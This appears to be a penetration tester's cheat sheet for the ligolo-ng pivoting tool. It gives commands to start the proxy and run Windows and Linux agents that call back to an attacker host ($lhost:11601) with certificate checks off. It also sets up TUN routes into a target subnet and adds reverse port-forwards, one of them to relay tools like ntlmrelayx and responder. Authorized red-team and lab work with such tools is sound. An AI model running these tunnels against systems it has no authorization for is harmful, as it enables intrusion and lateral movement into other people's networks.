# Ligolo

## ligolo

### Proxy server

Start proxy server with Ligolo.

Start the ligolo-ng proxy with a self-signed cert. Listens for agent callbacks on 11601.

```sh title:"Ligolo Start Proxy Server"
sudo ligolo-proxy -selfcert
```
<!-- cheat -->

### Windows agent

Execute windows agent with Ligolo.

Run the ligolo agent on a Windows pivot host, ignoring the proxy's self-signed cert.

```sh title:"Ligolo Execute Windows Agent"
.\agent.exe -ignore-cert -connect $lhost:11601
```
<!-- cheat
import tun_ip
-->

### Linux agent

Execute linux agent with Ligolo.

Same callback from a Linux pivot host.

```sh title:"Ligolo Execute Linux Agent"
./agent -ignore-cert -connect $lhost:11601
```
<!-- cheat
import tun_ip
-->

### Magic local route

Run magic local route with Ligolo.

Magic /32 route at 240.0.0.1 via the ligolo interface; lets the agent reach loopback ports on your attacker box (for ntlmrelayx, responder, etc.).

```sh title:"Ligolo Run Magic Local Route"
sudo ip route add 240.0.0.1/32 dev ligolo
```
<!-- cheat -->

### Create tun interface

Create tun interface with Ligolo.

Create a TUN interface owned by your user named `ligolo`. One-time setup before bringing it up.

```sh title:"Ligolo Create Tun Interface"
sudo ip tuntap add user $USER mode tun ligolo
```
<!-- cheat
import tun_ip
var USER
-->

### Bring tun up

Run bring tun up with Ligolo.

Bring the ligolo TUN interface up. Required after creation and after reboots.

```sh title:"Ligolo Run Bring Tun Up"
sudo ip link set ligolo up
```
<!-- cheat -->

### Route subnet via tun

Enumerate route subnet via tun with Ligolo.

Route a target /24 through the ligolo tunnel so any tool on your box reaches it transparently.

```sh title:"Ligolo Enumerate Route Subnet Via Tun"
sudo ip route add $rhost_ip/24 dev ligolo
```
<!-- cheat
var rhost_ip
-->

### Default reverse listener

List default reverse listener with Ligolo.

Default reverse port-forward inside the ligolo session. Exposes attacker 11601 on the pivot's 0.0.0.0:11601.

```sh title:"Ligolo List Default Reverse Listener"
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```
<!-- cheat -->

### Custom reverse listener

List custom reverse listener with Ligolo.

Custom reverse port-forward; pick the pivot bind port and the attacker-side destination.

```sh title:"Ligolo List Custom Reverse Listener"
listener_add --addr 0.0.0.0:$rport --to 127.0.0.1:$lport
```
<!-- cheat
import tun_ip
import lports
var rport
-->

